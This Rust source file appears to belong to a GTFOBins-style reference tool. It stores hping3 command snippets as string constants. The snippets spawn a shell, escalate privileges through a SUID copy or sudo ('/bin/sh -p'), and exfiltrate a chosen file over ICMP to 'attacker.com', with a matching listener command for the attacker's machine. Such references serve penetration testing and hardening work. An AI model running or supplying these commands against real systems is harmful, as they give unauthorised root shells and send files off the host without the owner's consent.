pub static BIN_NAME: &'static str = "hping3";
pub static SH_CODE: &'static str = r#"
    
    hping3
    /bin/sh
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which hping3) .

    ./hping3
    /bin/sh -p
"#;
pub static SUDO_CODE_1: &'static str = r#"
    
    sudo hping3
    /bin/sh
"#;
pub static SUDO_DESC_2: &'static str = "The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:";
pub static SUDO_CODE_2: &'static str = r#"
    
    sudo hping3 --icmp --listen xxx --dump
"#;
pub static SUDO_CODE_3: &'static str = r#"
    
    RHOST=attacker.com
    LFILE=file_to_read
    sudo hping3 "$RHOST" --icmp --data 500 --sign xxx --file "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
pub static SUDO_3: Code<'static> = Code {
    title: "SUDO_CODE_3",
    code: SUDO_CODE_3,
    tag: Tag::SUDO,
};
